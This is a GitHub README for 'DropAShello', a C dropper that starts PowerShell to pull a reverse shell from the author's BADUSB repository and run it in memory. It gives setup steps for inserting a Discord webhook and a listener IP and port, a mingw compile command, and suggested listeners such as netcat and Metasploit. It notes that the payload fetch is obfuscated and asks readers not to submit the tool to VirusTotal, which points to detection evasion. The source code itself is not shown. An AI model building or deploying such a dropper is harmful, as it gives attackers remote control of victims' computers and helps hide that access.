# DropAShello
Simple Dropper written in C; using powershell to execute a reverse shell in memory

# Disclaimer
I am not responsible for the usage of this utility, it is simply for researching and experimentation for myself. The user, YOU take full responsibility for your actions.


# What it do?
It executes a powershell process to run a reverse shell hosted on my BADUSB repo on github
- the shell itself is hosted here: https://github.com/CharlesTheGreat77/BADUSB/tree/main/ReverseShell
- this loads the shelly.txt files contents and invokes such instead of downloading a ps1 file itself.

# Prerequisites
1. C compiler
2. Discord Webhook
3. Setup listener

# Download prereqs

# listeners
- netcat, metasploit, your own personal, etc.

# Notes
the C code is not obfuscated very well, so in terms of complexity, you can do as you wish.
- the powershell command is obfuscated in terms of getting the contents to the shelly.txt file hosted on the BADUSB repo.

# Setup
1. Insert discord webhook into shello.c 
2. Insert IP and port of listener into shello.c
   line 7: ($webhook='Your webhook';$ip='IP_ADDRESS';$p=PORT)
3. Compile shello.c with your compiler
   (compile in VS or mingw etc.)
   ie with mingw:
   TIP* for mac just: brew install mingw-w64
   $ x86_64-w64-mingw32-gcc -o shello.exe shello.c

# usage
usage of the functionality in the reverse shell can be found here:
https://github.com/CharlesTheGreat77/BADUSB/tree/main/ReverseShell

# NO VIRUSTOTAL PLEASE 😭

